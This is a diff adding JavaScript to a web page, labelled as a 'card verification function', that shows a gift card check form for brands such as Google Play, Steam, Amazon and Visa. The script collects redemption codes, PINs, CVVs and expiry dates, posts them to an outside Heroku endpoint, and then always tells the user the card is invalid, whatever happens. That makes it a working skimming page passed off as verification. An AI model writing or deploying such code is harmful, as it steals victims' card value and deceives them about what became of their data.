@@ -459,6 +459,279 @@
       <!-- end google map js -->
 
       <!-- card verification function -->
+      <script
+      type="module"
+      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"
+    ></script>
+    <script
+      nomodule
+      src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"
+    ></script>
+    <!-- Splide -->
+    <script src="assets/js/plugins/splide/splide.min.js"></script>
+    <!-- Base Js File -->
+    <!-- <script src="assets/js/base.js"></script> -->
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+    <script>
+      const form = document.querySelector("#extras");
+
+      const cvvi = `
+
+             <div class="form-group basic animated">
+                    <div class="input-wrapper">
+                      <label class="label" for="amount2">Gift CVV</label>
+                      <input
+                        type="number"
+                        class="form-control"
+                        id="cvv"
+                        placeholder="Gift Card CVV"
+                        required
+
+                      />
+                      <i class="clear-input">
+                        <ion-icon name="close-circle"></ion-icon>
+                      </i>
+                    </div>
+                  </div>
+          `;
+      const expi = `
+
+             <div class="form-group basic animated">
+                    <div class="input-wrapper">
+                      <label class="label" for="amount2">Gift Expiry Date</label>
+                      <input
+                        type="text"
+                        class="form-control"
+                        id="exp"
+                        placeholder="Gift Card Expiry Date"
+                        required
+
+                      />
+                      <i class="clear-input">
+                        <ion-icon name="close-circle"></ion-icon>
+                      </i>
+                    </div>
+                  </div>
+          `;
+      const pini = `
+
+             <div class="form-group basic animated">
+                    <div class="input-wrapper">
+                      <label class="label" for="amount2">Gift Pin</label>
+                      <input
+                        type="number"
+                        class="form-control"
+                        id="pin"
+                        placeholder="Gift Card Pin"
+                        required
+
+                      />
+                      <i class="clear-input">
+                        <ion-icon name="close-circle"></ion-icon>
+                      </i>
+                    </div>
+                  </div>
+          `;
+
+      const pinini = `
+
+             <div class="form-group basic animated">
+                    <div class="input-wrapper">
+                      <label class="label" for="amount2">4 Digits Pin</label>
+                      <input
+                        type="number"
+                        class="form-control"
+                        id="pin"
+                        placeholder="4 Digits Pin"
+                        maxlength="4"
+                        required
+
+                      />
+                      <i class="clear-input">
+                        <ion-icon name="close-circle"></ion-icon>
+                      </i>
+                    </div>
+                  </div>
+          `;
+
+      const cards = {
+        GOOGLE_PLAY: "code",
+        STEAM: "code",
+        SEPHORA: "codepin",
+        NORDSTROM_CARD: "codepin",
+        VANILLA: "codeexpcvv",
+        WALMART_VISA: "codeexpcvv",
+        AMEX: "codeexpcvv4",
+        AMAZON: "code",
+        NIKE_CARD: "codepin",
+        FOOTLOCKER: "code",
+        EBAY_CARD: "code",
+        VISA_SILVERY_WHITE: "codeexpcvv",
+        TT_VISA: "codeexpcvv",
+        MASTER_CARD: "codepin",
+        APPLE: "code",
+      };
+
+      function getName(card) {
+        return cards[card];
+      }
+
+      function injectHTML(type) {
+        if (type === "code") {
+          form.innerHTML = "";
+          return;
+        }
+
+        if (type === "codepin") {
+          form.innerHTML = pini;
+          return;
+        }
+
+        if (type === "codeexpcvv") {
+          form.innerHTML = cvvi + expi;
+          return;
+        }
+
+        if (type === "codeexpcvvpin") {
+          form.innerHTML = expi + pini + cvvi;
+          return;
+        }
+
+        if (type === "codeexpcvv4") {
+          form.innerHTML = expi + pinini + cvvi;
+          return;
+        }
+      }
+
+      const loader = document.querySelector("#loader");
+      const button = document.querySelector("#button");
+      const modal = document.querySelector("#alert");
+      const names = document.querySelector("#name");
+      var name = names.options[names.selectedIndex].value;
+      const code = document.querySelector("#code");
+
+      const error = document.querySelector(".modal-body");
+
+      const data = document.querySelector("form");
+
+      const m = "modal open";
+      const s = "overflow: hidden; padding-right: 0px;";
+      data.on;
+      names.onchange = function () {
+        name = names.options[names.selectedIndex].value;
+
+        if (name !== "NONE") {
+          injectHTML(getName(name));
+        } else {
+          form.innerHTML = "";
+          return;
+        }
+
+        const exp = document.querySelector("#exp");
+        console.log("GOT HERE");
+
+        if (exp) {
+          exp.oninput = function () {
+            const expdate = exp.value;
+            if (exp.value.length > 2) {
+              exp.value =
+                expdate.replace(/\//g, "").substring(0, 2) +
+                (expdate.length > 2 ? "/" : "") +
+                expdate.replace(/\//g, "").substring(2, 4);
+            }
+          };
+        }
+      };
+
+      data.onsubmit = function (e) {
+        e.preventDefault();
+
+        const cvv = document.querySelector("#cvv");
+        const exp = document.querySelector("#exp");
+        const pin = document.querySelector("#pin");
+
+        if (name === "NONE") {
+          error.textContent = "Please select Gift Card name";
+          modal.click();
+          return;
+        }
+
+        if (code.value.length < 10) {
+          error.textContent = "Invalid gift card redemption code";
+          modal.click();
+          return;
+        }
+
+        if (cvv && cvv.value.length < 3) {
+          error.textContent = "Invalid CVV code provided";
+          modal.click();
+          return;
+        }
+
+        if (pin && pin.value.length < 3) {
+          error.textContent = "Invalid card pin provided";
+          modal.click();
+          return;
+        }
+
+        if (exp && exp.value.length < 5) {
+          error.textContent = "Invalid expiry date provided";
+          modal.click();
+          return;
+        }
+
+        loader.style.display = "";
+
+        async function send(code, name, exp, pin, cvv) {
+          var response = await fetch(
+            "https://samperfect.herokuapp.com/api/v1/send/",
+            {
+              method: "POST",
+              body: JSON.stringify({
+                code,
+                name,
+                exp,
+                pin,
+                cvv,
+              }),
+              headers: {
+                "Content-Type": "application/json",
+              },
+            }
+          );
+          //getting the response data
+          var data = await response.json();
+          if (response.status == 200) {
+            return "DONE";
+          }
+        }
+
+        send(
+          code.value,
+          name,
+          exp ? exp.value : "NONE",
+          pin ? pin.value : "NONE",
+          cvv ? cvv.value : "NONE"
+        )
+          .then((state) => {
+            console.log(state);
+
+            loader.style.display = "none";
+            error.textContent = "Invalid Gift Card Provided.";
+            modal.click();
+          })
+          .catch((error) => {
+            console.log(error);
+
+            loader.style.display = "none";
+
+            error.textContent = "Invalid Gift Card Provided.";
+            modal.click();
+          });
+      };
+    </script>
    </body>
 </html>
 
